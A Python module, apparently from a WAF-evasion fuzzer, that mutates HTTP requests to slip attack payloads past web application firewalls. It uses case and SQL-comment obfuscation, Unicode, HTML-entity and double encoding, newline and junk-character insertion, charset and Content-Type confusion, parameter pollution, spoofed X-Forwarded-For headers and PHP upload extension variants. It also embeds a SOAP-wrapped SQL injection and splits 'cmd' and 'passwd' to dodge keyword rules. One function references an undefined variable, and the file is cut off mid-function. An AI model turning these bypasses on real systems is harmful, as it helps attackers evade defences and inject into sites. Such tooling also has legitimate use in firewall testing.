from collections import Counter
import copy
import itertools
import json
import os
import random
import string 
import re
import urllib.parse
import uuid
from utils.logUtils import LoggerSingleton
from utils.dictUtils import content_types

logger = LoggerSingleton().get_logger()
TAG = "prowler_mutant_methods.py: "


def mutant_methods_modify_content_type_for_rl(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_modify_content_type")
    logger.debug(TAG + "==>headers: " + str(headers))
    mutant_payloads = []
    if 'Content-Type' in headers:
        for content_type in content_types:
            headers['Content-Type'] += ';' + content_type
    else:
        for content_type in content_types:
            headers['Content-Type'] = ';' + content_type + ';'
    mutant_payloads.append({
        'headers': headers,
        'url': url,
        'method': method,
        'data': data,
        'files': files
    })

    return mutant_payloads


def mutant_methods_modify_content_type(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_modify_content_type")
    logger.debug(TAG + "==>headers: " + str(headers))
    mutant_payloads = []
    original_headers = copy.deepcopy(headers)
    if 'Content-Type' in headers:
        # use copy.deepcopy to avoid modifying the original headers
        for content_type in content_types:
            headers['Content-Type'] += ';' + content_type
            mutant_payloads.append({
                'headers': headers,
                'url': url,
                'method': method,
                'data': data,
                'files': files
            })
            headers = copy.deepcopy(original_headers)
    else:
        for content_type in content_types:
            headers['Content-Type'] = ';' + content_type + ';'
            mutant_payloads.append({
                'headers': headers,
                'url': url,
                'method': method,
                'data': data,
                'files': files
            })
            headers = copy.deepcopy(original_headers)
    return mutant_payloads


def mutant_methods_change_request_method(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_change_request_method")
    logger.debug(TAG + "==>headers: " + str(headers))
    if method == 'GET':
        # 解析 URL 和查询参数
        parsed_url = urllib.parse.urlparse(url)
        get_params = urllib.parse.parse_qs(parsed_url.query)
        # add     "Content-Type": "application/x-www-form-urlencoded" to headers
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        # 构建新的 POST 请求
        post_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        post_url = post_url.replace('get', 'post')
        post_data = {k: v[0] for k, v in get_params.items()}  # 将查询参数变成 POST 数据
        return headers, post_url, 'POST', post_data, files, True
    else:
        return headers, url, method, data, files, False


# 协议未覆盖绕过
# 在 http 头里的 Content-Type 提交表单支持四种协议：
# •application/x-www-form-urlencoded -编码模式
# •multipart/form-data -文件上传模式
# •text/plain -文本模式
# •application/json -json模式
# 文件头的属性是传输前对提交的数据进行编码发送到服务器。其中 multipart/form-data 
# 表示该数据被编码为一条消息,页上的每个控件对应消息中的一个部分。所以，当 waf 没有规则匹配该协议传输的数据时可被绕过。
def mutant_methods_fake_content_type(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_fake_content_type")
    logger.debug(TAG + "==>headers: " + str(headers))
    mutant_payloads = []
    if 'Content-Type' in headers:
        for content_type in content_types:
            headers['Content-Type'] = content_type + ';'
            mutant_payloads.append({
                'headers': headers,
                'url': url,
                'method': method,
                'data': data,
                'files': files
            })

    return mutant_payloads


def random_case(text):
    """Randomly changes the case of each character in the text."""
    return ''.join([c.upper() if random.choice([True, False]) else c.lower() for c in text])


def insert_comments(text):
    """Insert random comments or spaces in the text to break up keywords."""
    parts = list(text)
    for i in range(1, len(parts) - 1):
        if random.choice([True, False]):
            parts[i] = '/*' + parts[i] + '*/'
    return ''.join(parts)


def insert_spaces(text):
    """Insert random comments or spaces in the text to break up keywords."""
    parts = list(text)
    for i in range(1, len(parts) - 1):
        if random.choice([True, False]):
            parts[i] = ' ' + parts[i]
    return ''.join(parts)


def unicode_normalize(payload):
    """
    使用 Unicode 字符对输入的 payload 进行编码,以尝试绕过安全限制。
    
    参数:
    payload (str): 需要进行 Unicode 编码的原始 payload
    
    返回:
    str: 编码后的 payload
    """
    normalized_payload = ""
    for char in payload:
        # 检查字符是否为 ASCII 字符
        if char.isascii():
            # 如果是 ASCII 字符,则使用 Unicode 编码进行替换
            if random.choice([False, False, True, False, False]):
                normalized_payload += f"\\u{ord(char):04X}"
            else:
                normalized_payload += char
        else:
            normalized_payload += char
    return normalized_payload


def html_entity_bypass(payload):
    """
    使用 HTML 实体编码对输入的 payload 进行编码,以尝试绕过安全限制。
    
    参数:
    payload (str): 需要进行 HTML 实体编码的原始 payload
    
    返回:
    str: 编码后的 payload
    """
    html_entities = {
        '"': '&#34;',
        "'": '&#39;',
        '<': '&#60;',
        '>': '&#62;',
        '&': '&#38;'
    }

    encoded_payload = ""
    for char in payload:
        encoded_payload += html_entities.get(char, char)
    return encoded_payload


def double_encode(payload):
    """
    使用双重编码对输入的 payload 进行编码,以尝试绕过安全过滤器。
    
    参数:
    payload (str): 需要进行双重编码的原始 payload
    
    返回:
    str: 双重编码后的 payload
    """
    first_encoded = urllib.parse.quote(payload)
    second_encoded = urllib.parse.quote(first_encoded)
    return second_encoded


def newline_bypass(payload):
    """
    在输入的 payload 中插入换行符,以尝试绕过基于正则表达式的安全过滤器。
    
    参数:
    payload (str): 需要进行换行符插入的原始 payload
    
    返回:
    str: 插入换行符后的 payload
    """
    newline_chars = ["", "\r", "", "\n", "", "\r\n", ""]

    # 在 payload 中随机插入换行符
    obfuscated_payload = ""
    for char in payload:
        obfuscated_payload += char
        if char.isalnum() and random.choice([False, False, True]):
            obfuscated_payload += newline_chars[random.randint(0, len(newline_chars) - 1)]

    return obfuscated_payload


def tab_bypass(payload):
    """
    在输入的 payload 中插入换行符,以尝试绕过基于正则表达式的安全过滤器。
    
    参数:
    payload (str): 需要进行换行符插入的原始 payload
    
    返回:
    str: 插入换行符后的 payload
    """
    newline_chars = ["", "\t", "", "\n", "", "\t\n", ""]

    # 在 payload 中随机插入换行符
    obfuscated_payload = ""
    for char in payload:
        obfuscated_payload += char
        if char.isalnum() and random.choice([False, False, True]):
            obfuscated_payload += newline_chars[random.randint(0, len(newline_chars) - 1)]

    return obfuscated_payload


def garbage_character_bypass(payload):
    """
    在输入的 payload 中添加随机垃圾字符,以尝试绕过基于正则表达式的安全过滤器。
    
    参数:
    payload (str): 需要添加垃圾字符的原始 payload
    
    返回:
    str: 添加垃圾字符后的 payload
    """
    # 定义一些常见的垃圾字符
    garbage_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%&()*~+-_.,:;?@[/|\\]^`="

    # 在 payload 中随机插入垃圾字符
    obfuscated_payload = ""
    for char in payload:
        obfuscated_payload += char
        if char.isalnum() and random.choice([False, False, True]):
            num_garbage = random.randint(1, 10)
            obfuscated_payload += "".join(random.choices(garbage_chars, k=num_garbage))
    return obfuscated_payload


def mutant_methods_case_and_comment_obfuscation(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_case_and_comment_obfuscation")
    logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []

    # Apply random case and comment obfuscation to the URL
    parsed_url = urllib.parse.urlparse(url)
    obfuscated_path = random_case(insert_comments(parsed_url.path))
    obfuscated_query = random_case(insert_comments(parsed_url.query))
    mutated_url = urllib.parse.urlunparse(parsed_url._replace(path=obfuscated_path, query=obfuscated_query))

    # Apply the same to data if it's a string
    mutated_data = data
    if isinstance(data, str):
        mutated_data = random_case(insert_comments(data))

    # Apply the same to file names if present
    mutated_files = files
    if files:
        mutated_files = {name: (random_case(insert_comments(filename)), file) for name, (filename, file) in
                         files.items()}

    # Create the mutated payload
    mutant_payloads.append({
        'headers': headers,
        'url': mutated_url,
        'method': method,
        'data': mutated_data,
        'files': mutated_files
    })

    return mutant_payloads


def mutant_methods_space_obfuscation(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_space_obfuscation")
    logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []

    # Apply random case and comment obfuscation to the URL
    parsed_url = urllib.parse.urlparse(url)
    # obfuscated_path = random_case(insert_spaces(parsed_url.path))
    obfuscated_path = parsed_url.path
    obfuscated_query = insert_spaces(parsed_url.query)

    mutated_url = urllib.parse.urlunparse(parsed_url._replace(path=obfuscated_path, query=obfuscated_query))
    # print(mutated_url)
    # Apply the same to data if it's a string
    mutated_data = data
    if isinstance(data, str):
        mutated_data = insert_spaces(data)

    # Apply the same to file names if present
    mutated_files = files
    if files:
        mutated_files = {name: (insert_spaces(filename), file) for name, (filename, file) in files.items()}

    # Create the mutated payload
    mutant_payloads.append({
        'headers': headers,
        'url': mutated_url,
        'method': method,
        'data': mutated_data,
        'files': mutated_files
    })
    return mutant_payloads


def mutant_methods_upper_obfuscation(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_upper_obfuscation")
    logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []

    # Apply random case and comment obfuscation to the URL
    parsed_url = urllib.parse.urlparse(url)
    obfuscated_path = parsed_url.path
    obfuscated_query = random_case(parsed_url.query)
    mutated_url = urllib.parse.urlunparse(parsed_url._replace(path=obfuscated_path, query=obfuscated_query))

    # Apply the same to data if it's a string
    mutated_data = data
    if isinstance(data, str):
        mutated_data = random_case(data)

    # Apply the same to file names if present
    mutated_files = files
    if files:
        mutated_files = {name: (random_case(filename), file) for name, (filename, file) in files.items()}

    # Create the mutated payload
    mutant_payloads.append({
        'headers': headers,
        'url': mutated_url,
        'method': method,
        'data': mutated_data,
        'files': mutated_files
    })
    return mutant_payloads


def mutant_methods_unicode_obfuscation(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_unicode_obfuscation")
    logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []

    # Apply random case and comment obfuscation to the URL
    parsed_url = urllib.parse.urlparse(url)
    obfuscated_path = parsed_url.path
    obfuscated_query = unicode_normalize(parsed_url.query)
    mutated_url = urllib.parse.urlunparse(parsed_url._replace(path=obfuscated_path, query=obfuscated_query))

    # Apply the same to data if it's a string
    mutated_data = data
    if isinstance(data, str):
        mutated_data = unicode_normalize(data)

    # Apply the same to file names if present
    mutated_files = files
    if files:
        mutated_files = {name: (unicode_normalize(filename), file) for name, (filename, file) in files.items()}

    # Create the mutated payload
    mutant_payloads.append({
        'headers': headers,
        'url': mutated_url,
        'method': method,
        'data': mutated_data,
        'files': mutated_files
    })
    return mutant_payloads


def mutant_methods_html_obfuscation(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_html_obfuscation")
    logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []

    # Apply random case and comment obfuscation to the URL
    parsed_url = urllib.parse.urlparse(url)
    obfuscated_path = parsed_url.path
    obfuscated_query = html_entity_bypass(parsed_url.query)
    mutated_url = urllib.parse.urlunparse(parsed_url._replace(path=obfuscated_path, query=obfuscated_query))

    # Apply the same to data if it's a string
    mutated_data = data
    if isinstance(data, str):
        mutated_data = html_entity_bypass(data)

    # Apply the same to file names if present
    mutated_files = files
    if files:
        mutated_files = {name: (html_entity_bypass(filename), file) for name, (filename, file) in files.items()}

    # Create the mutated payload
    mutant_payloads.append({
        'headers': headers,
        'url': mutated_url,
        'method': method,
        'data': mutated_data,
        'files': mutated_files
    })
    return mutant_payloads


def mutant_methods_double_decode_obfuscation(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_double_decode_obfuscation")
    logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []

    # Apply random case and comment obfuscation to the URL
    parsed_url = urllib.parse.urlparse(url)
    obfuscated_path = parsed_url.path
    obfuscated_query = double_encode(parsed_url.query)
    mutated_url = urllib.parse.urlunparse(parsed_url._replace(path=obfuscated_path, query=obfuscated_query))

    # Apply the same to data if it's a string
    mutated_data = data
    if isinstance(data, str):
        mutated_data = double_encode(data)

    # Apply the same to file names if present
    mutated_files = files
    if files:
        mutated_files = {name: (html_entity_bypass(filename), file) for name, (filename, file) in files.items()}

    # Create the mutated payload
    mutant_payloads.append({
        'headers': headers,
        'url': mutated_url,
        'method': method,
        'data': mutated_data,
        'files': mutated_files
    })
    return mutant_payloads


def mutant_methods_newline_obfuscation(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_newline_obfuscation")
    logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []

    # Apply random case and comment obfuscation to the URL
    parsed_url = urllib.parse.urlparse(url)
    obfuscated_path = parsed_url.path
    obfuscated_query = newline_bypass(parsed_url.query)
    mutated_url = urllib.parse.urlunparse(parsed_url._replace(path=obfuscated_path, query=obfuscated_query))
    # print(obfuscated_query)
    # input()

    # Apply the same to data if it's a string
    mutated_data = data
    if isinstance(data, str):
        mutated_data = newline_bypass(data)
    # print(mutated_data)
    # input()

    # Apply the same to file names if present
    mutated_files = files
    if files:
        mutated_files = {name: (newline_bypass(filename), file) for name, (filename, file) in files.items()}

    # Create the mutated payload
    mutant_payloads.append({
        'headers': headers,
        'url': mutated_url,
        'method': method,
        'data': mutated_data,
        'files': mutated_files
    })
    return mutant_payloads


def mutant_methods_tab_obfuscation(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_tab_obfuscation")
    logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []

    # Apply random case and comment obfuscation to the URL
    parsed_url = urllib.parse.urlparse(url)
    obfuscated_path = parsed_url.path
    obfuscated_query = tab_bypass(parsed_url.query)
    mutated_url = urllib.parse.urlunparse(parsed_url._replace(path=obfuscated_path, query=obfuscated_query))

    # Apply the same to data if it's a string
    mutated_data = data
    if isinstance(data, str):
        mutated_data = tab_bypass(data)

    # Apply the same to file names if present
    mutated_files = files
    if files:
        mutated_files = {name: (tab_bypass(filename), file) for name, (filename, file) in files.items()}

    # Create the mutated payload
    mutant_payloads.append({
        'headers': headers,
        'url': mutated_url,
        'method': method,
        'data': mutated_data,
        'files': mutated_files
    })
    return mutant_payloads


def mutant_methods_garbage_character_obfuscation(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_garbage_character_obfuscation")
    logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []

    # Apply random case and comment obfuscation to the URL
    parsed_url = urllib.parse.urlparse(url)
    obfuscated_path = parsed_url.path
    obfuscated_query = garbage_character_bypass(parsed_url.query)
    mutated_url = urllib.parse.urlunparse(parsed_url._replace(path=obfuscated_path, query=obfuscated_query))

    # Apply the same to data if it's a string
    mutated_data = data
    if isinstance(data, str):
        mutated_data = garbage_character_bypass(data)

    # Apply the same to file names if present
    mutated_files = files
    if files:
        mutated_files = {name: (garbage_character_bypass(filename), file) for name, (filename, file) in files.items()}

    # Create the mutated payload
    mutant_payloads.append({
        'headers': headers,
        'url': mutated_url,
        'method': method,
        'data': mutated_data,
        'files': mutated_files
    })
    return mutant_payloads


def url_encode_payload(payload):
    """Helper function to URL encode a given payload."""
    return urllib.parse.quote(payload, safe='/:&?=')


def mutant_methods_url_encoding(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_url_encoding")
    logger.debug(TAG + "==>headers: " + str(headers))

    # Create a list to hold the mutated payloads
    mutant_payloads = []

    # URL encode only the query parameters or other parts of the URL
    parsed_url = urllib.parse.urlparse(url)
    encoded_query = urllib.parse.quote(parsed_url.query, safe='=&')
    encoded_path = urllib.parse.quote(parsed_url.path, safe='/')
    mutated_url = urllib.parse.urlunparse(parsed_url._replace(path=encoded_path, query=encoded_query))

    # URL encode the data if it's a string
    mutated_data = data
    if isinstance(data, str):
        mutated_data = url_encode_payload(data)

    # URL encode file names if present
    mutated_files = {}
    if files:
        try:
            mutated_files = {name: (url_encode_payload(filename), file) for name, (filename, file) in files.items()}
        except ValueError:
            logger.warning(TAG + "Error in mutant_methods_url_encoding: could not URL encode file names.")
            logger.warning(
                TAG + "Invalid structure in 'files'; expected dictionary values to be tuples of two elements.")

    # Create the mutated payload
    mutant_payloads.append({
        'headers': headers,
        'url': mutated_url,
        'method': method,
        'data': mutated_data if mutated_data is not None else data,
        'files': mutated_files if mutated_files is not None else files
    })

    return mutant_payloads


def mutant_upload_methods_double_equals(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_upload_methods_double_equals")
    logger.debug(TAG + "==>headers: " + str(headers))
    if isinstance(data, bytes):

        data_str = data.decode()
    else:
        data_str = data
    mutant_payloads = []
    # 只有 multipart/form-data 才需要可以使用这个方法
    content_type = headers.get('Content-Type')
    if content_type and re.match('multipart/form-data', content_type) or 'filename' in str(data):
        if 'filename' in data_str:
            data_str = data_str.replace('filename', 'filename=')
            mutant_payloads.append({
                'headers': headers,
                'url': url,
                'method': method,
                'data': data_str
            })
    else:
        logger.info(TAG + "data is" + str(data))
        logger.info(TAG + "No filename found in data")
    # if files:
    #     if 'filename' in files:
    #         files['filename'] = files['filename'] + "="
    #         mutant_payloads.append({
    #             'headers': headers,
    #             'url': url,
    #             'method': method,
    #             'data': data,
    #             'files': files
    #         })

    return mutant_payloads


def unicode_obfuscate(text):
    """Helper function to encode ASCII characters into their Unicode equivalent."""
    obfuscated_text = ""
    for char in text:
        if random.choice([True, False]):
            # 50% chance to obfuscate each character
            obfuscated_text += '\\u{:04x}'.format(ord(char))
        else:
            obfuscated_text += char
    return obfuscated_text


def mutant_methods_unicode_normalization(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_unicode_normalization")
    logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []

    # Apply Unicode obfuscation to URL path and query
    parsed_url = urllib.parse.urlparse(url)
    obfuscated_path = unicode_obfuscate(parsed_url.path)
    obfuscated_query = unicode_obfuscate(parsed_url.query)
    mutated_url = urllib.parse.urlunparse(parsed_url._replace(path=obfuscated_path, query=obfuscated_query))

    # Apply Unicode obfuscation to the data if it's a string
    mutated_data = data
    if isinstance(data, str):
        mutated_data = unicode_obfuscate(data)

    # Apply Unicode obfuscation to file names if present
    mutated_files = files
    if files:
        mutated_files = {name: (unicode_obfuscate(filename), file) for name, (filename, file) in files.items()}

    # Create the mutated payload
    mutant_payloads.append({
        'headers': headers,
        'url': mutated_url,
        'method': method,
        'data': mutated_data,
        'files': mutated_files
    })

    return mutant_payloads


def insert_line_breaks(text):
    """Helper function to insert CR/LF characters randomly in the text."""
    obfuscated_text = ""
    for char in text:
        if random.choice([True, False]):
            obfuscated_text += '%0A'  # LF (Line Feed)
        obfuscated_text += char
    return obfuscated_text


def mutant_methods_line_breaks(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_line_breaks")
    logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []

    # Apply line breaks to URL path and query
    parsed_url = urllib.parse.urlparse(url)
    obfuscated_path = insert_line_breaks(parsed_url.path)
    obfuscated_query = insert_line_breaks(parsed_url.query)
    mutated_url = urllib.parse.urlunparse(parsed_url._replace(path=obfuscated_path, query=obfuscated_query))

    # Apply line breaks to the data if it's a string
    mutated_data = data
    if isinstance(data, str):
        mutated_data = insert_line_breaks(data)

    # Apply line breaks to file names if present
    mutated_files = {}
    if files:
        try:
            mutated_files = {name: (insert_line_breaks(filename), file) for name, (filename, file) in files.items()}
        except ValueError:
            logger.warning(TAG + "Error in mutant_methods_line_breaks")
            logger.warning(
                TAG + "Invalid structure in 'files'; expected dictionary values to be tuples of two elements.")
    # Create the mutated payload
    mutant_payloads.append({
        'headers': headers,
        'url': mutated_url,
        'method': method,
        'data': mutated_data,
        'files': mutated_files
    })

    return mutant_payloads


def mutant_methods_add_random_harmless_param(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_add_random_harmless_param")
    # 生成随机参数名和值
    param_name = ''.join(random.choices(string.ascii_lowercase, k=5))
    param_value = ''.join(random.choices(string.ascii_lowercase, k=10))
    if method == 'GET':
        if '?' in url:
            url = url + f'&{param_name}={param_value}'
        else:
            url = url + f'?{param_name}={param_value}'
    elif method == 'POST':
        if isinstance(data, dict):
            data[param_name] = param_value

    mutant_payloads=[{
        'headers': new_headers,
        'url': url,
        'method': method,
        'data': data,
        'files': files
    }]
    logger.debug(TAG + "==>mutant_payloads: " + str(mutant_payloads))
    
    return mutant_payloads


# 常见的 User-Agent 列表
COMMON_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
]

def mutant_methods_modify_user_agent(headers, url, method, data, files):
    """ 修改请求头中的 User-Agent 为常见的浏览器或爬虫的 User-Agent """
    logger.info(TAG + "==>mutant_methods_modify_user_agent")
    mutant_payloads = []

    # 复制原始的 headers
    new_headers = headers.copy()

    # 随机选择一个 User-Agent
    new_user_agent = random.choice(COMMON_USER_AGENTS)
    new_headers['User-Agent'] = new_user_agent

    mutant_payloads.append({
        'headers': new_headers,
        'url': url,
        'method': method,
        'data': data,
        'files': files
    })

    logger.debug(TAG + "==>mutant_payloads: " + str(mutant_payloads))
    return mutant_payloads
    

def mutant_methods_for_test_use(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_for_test_use")
    # logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []
    if data:
        print(data)
        # replace cmd to c%0Amd in data
        data = data.replace('cmd', 'c%0Amd')
        data = data.replace('passwd', 'passw%0Ad')
        data = data.replace('SELECT', 'se/*comment*/lect')
        print(data)

        # exit()
    url = url.replace('cmd', 'c%0Amd')
    url = url.replace('SELECT', 'se/*comment*/lect')
    url = url.replace('passwd', 'passw%0Ad')
    print(url)
    mutant_payloads.append({
        'headers': headers,
        'url': url,
        'method': method,
        'data': data,
        'files': files
    })
    logger.debug(TAG + "==>mutant_payloads: " + str(mutant_payloads))
    return mutant_payloads


def mutant_methods_transform_SOAP(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_transform_SOAP")
    # logger.debug(TAG + "==>headers: " + str(headers))
    # 构造SOAP请求的XML格式

    soap_request = [f"""<soapenv:envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
        <soapenv:header>
            <soapenv:body>
                <string>'{data}#</string>
            </soapenv:body>
        </soapenv:header>
    </soapenv:envelope>""", f"""<soapenv:envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
        <soapenv:header>
            <soapenv:body>
                <string>'union select current_user, 2#</string>
            </soapenv:body>
        </soapenv:header>
    </soapenv:envelope>"""]

    modified_headers = copy.deepcopy(headers)
    # print(modified_headers['Content-Type'])
    modified_headers["Content-Type"] = "application/octet-stream,text/xml"

    mutant_payloads = []

    mutant_payloads.append({
        'headers': modified_headers,
        'url': url,
        'method': method,
        'data': random.choice(soap_request),
        'files': files
    })
    logger.debug(TAG + "==>mutant_payloads: " + str(mutant_payloads))
    return mutant_payloads


def mutant_methods_change_extensions(headers, url, method, data, files):
    """
    生成不同的 Content-Type 和字符集变体

    """
    logger.info(TAG + "==>mutant_methods_change_charset")
    # logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []

    valid_extensions = ['phtml', 'php', 'php3', 'php4', 'php5', 'inc', 'pHtml', 'pHp', 'pHp3', 'pHp4', 'pHp5', 'iNc']
    extensions_choice = random.choice(valid_extensions)
    if isinstance(data, bytes):
        data = data.decode('utf-8').replace('php', 'php5').encode('utf-8')

    mutant_payloads.append({
        'headers': headers,
        'url': url,
        'method': method,
        'data': data,
        'files': files
    })

    logger.debug(TAG + "==>mutant_payloads: " + str(mutant_payloads))

    return mutant_payloads


def mutant_methods_change_charset(headers, url, method, data, files):
    """
    生成不同的 Content-Type 和字符集变体

    """
    logger.info(TAG + "==>mutant_methods_change_charset")
    # logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []

    # Content-Type 变体列表
    content_type_variations = [
        # 标准编码
        "application/x-www-form-urlencoded;charset=ibm037",
        # 多部分表单数据
        "multipart/form-data; charset=ibm037,boundary=blah",
        "multipart/form-data; boundary=blah ; charset=ibm037",
        # 多内容类型
        "text/html; charset=UTF-8 application/json; charset=utf-8",

        # 额外的变体
        "application/json;charset=windows-1252",
        "text/plain;charset=iso-8859-1",
        "application/xml;charset=shift_jis",

        # 带空格和特殊字符的变体
        # " application/x-www-form-urlencoded ; charset = utf-8 ",
        # "multipart/form-data;  boundary = test-payloads-boundary ; charset=gb2312 ",
    ]
    weights = [0.58] + [0.07] * 6
    content_type = random.choices(content_type_variations, weights=weights)[0]
    content_type = content_type_variations[0]
    # content_type=random.choice(content_type_variations)
    # input()
    # 修改请求头中的 Content-Type
    modified_headers = copy.deepcopy(headers)
    # print(modified_headers['Content-Type'])
    modified_headers['Content-Type'] = content_type
    # print(content_type)
    # input()

    mutant_payloads.append({
        'headers': modified_headers,
        'url': url,
        'method': method,
        'data': data,
        'files': files
    })

    logger.debug(TAG + "==>mutant_payloads: " + str(mutant_payloads))

    return mutant_payloads


def mutant_methods_add_accept_charset(headers, url, method, data, files):
    """
    生成不同的 Content-Type 和字符集变体

    """
    logger.info(TAG + "==>mutant_methods_change_charset")
    # logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []

    # 字符集变体列表
    charset_variations = [
        "utf-32; q=0.5",  # 原始要求
        "utf-8; q=1.0",
        "iso-8859-1; q=0.8",
        "windows-1252; q=0.3",
        "utf-16; q=0.7",
        "gb2312; q=0.6",
        "shift_jis; q=0.4",
        "utf-32; q=0.5, utf-8; q=1.0",  # 多字符集
        "* ; q=0.1",  # 通配符
    ]

    weights = [0.66] + [0.03] * 8
    content_type = random.choices(charset_variations, weights=weights)[0]
    # 修改请求头中的 Content-Type
    modified_headers = copy.deepcopy(headers)
    # print(modified_headers['Content-Type'])
    modified_headers['Accept-Charset'] = content_type
    # print(headers)
    # print(modified_headers)
    # input()
    mutant_payloads.append({
        'headers': modified_headers,
        'url': url,
        'method': method,
        'data': data,
        'files': files
    })

    logger.debug(TAG + "==>mutant_payloads: " + str(mutant_payloads))

    return mutant_payloads


def mutant_methods_fake_IP(headers, url, method, data, files):
    """
    随机向headers中注入IP欺骗相关的头部信息
    
    Args:
        headers (dict): 原始HTTP请求头
    
    Returns:
        dict: 添加了随机IP头部的请求头
    """
    logger.info(TAG + "==>mutant_methods_fake_IP")
    mutant_payloads = []
    # IP欺骗相关的头部列表
    ip_headers = [
        "X-Originating-IP",
        "X-Forwarded-For",
        "X-Remote-IP",
        "X-Remote-Addr",
        "X-Client-IP"
    ]

    # 可选的IP地址列表
    ip_addresses = [
        "127.0.0.1",  # 本地回环地址
        "192.168.1.1",  # 私有网段
        "10.0.0.1",  # 私有网段
        "172.16.0.1"  # 私有网段
    ]

    # 复制原始headers,避免修改原始对象
    modified_headers = copy.deepcopy(headers)

    # 随机选择要添加的头部数量(1-3个)
    num_headers_to_add = random.randint(1, 3)

    # 随机选择要添加的头部
    selected_headers = random.sample(ip_headers, num_headers_to_add)

    # 随机选择IP地址
    for header in selected_headers:
        ip = random.choice(ip_addresses)
        modified_headers[header] = ip

    mutant_payloads.append({
        'headers': modified_headers,
        'url': url,
        'method': method,
        'data': data,
        'files': files
    })

    # print(mutant_payloads)
    # input()
    logger.debug(TAG + "==>mutant_payloads: " + str(mutant_payloads))
    return mutant_payloads


def mutant_methods_perameter_pollution_case1(headers, url, method, data, files):
    '''
    服务器使用最后收到的参数, WAF 只检查第一个参数。
    '''

    logger.info(TAG + "==>mutant_methods_perameter_pollution_case1")
    # logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []

    if data:
        # print(data)
        # input()
        plt_data = ""
        if type(data) == str:
            if "=" in data:
                no_poc = random.choice(["ls", "1", "1.jpg"])
                pera = data.split("=")[0]
                poc = data.split("=")[1]
                for _ in range(3):
                    plt_data += pera + "=" + no_poc + "\n"
                plt_data += pera + "=" + poc
            if ":" in data:
                no_poc = random.choice(["\"ls\"}", "\"1\"}", "\"1.jpg\"}"])
                pera = data.split(":")[0]
                poc = data.split(":")[1]
                for _ in range(3):
                    plt_data += pera + ":" + no_poc + "\n"
                plt_data += pera + ":" + poc
        else:
            plt_data = data

        mutant_payloads.append({
            'headers': headers,
            'url': url,
            'method': method,
            'data': plt_data,
            'files': files
        })
    else:
        parsed_url = urllib.parse.urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        query_params = urllib.parse.parse_qs(parsed_url.query, keep_blank_values=True)
        # 为每个参数创建重复的测试用例
        for param, values in query_params.items():
            original_value = values[0]

            # 构造重复参数
            duplicate_params = []

            for _ in range(3):  # 创建3个重复参数
                duplicate_params.append((param, "1"))

            duplicate_params.append((param, original_value))
            # 添加其他原始参数
            for other_param, other_values in query_params.items():
                if other_param != param:
                    duplicate_params.append((other_param, other_values[0]))

            # 构造新的查询字符串
            query_string = '&'.join(f"{p}={v}" for p, v in duplicate_params)
            test_url = f"{base_url}?{query_string}"

            mutant_payloads.append({
                'headers': headers,
                'url': test_url,
                'method': method,
                'data': data,
                'files': files
            })

    logger.debug(TAG + "==>mutant_payloads: " + str(mutant_payloads))
    # print(mutant_payloads)
    # input("")
    return mutant_payloads


def mutant_methods_perameter_pollution_case2(headers, url, method, data, files):
    '''
    服务器将来自相似参数的值合并,WAF 会单独检查它们。
    '''
    logger.info(TAG + "==>mutant_methods_for_test_use")
    # logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []
    if data:
        plt_data = ""

        if type(data) == str:
            if "=" in data:
                pera = data.split("=")[0]
                poc = data.split("=")[1]
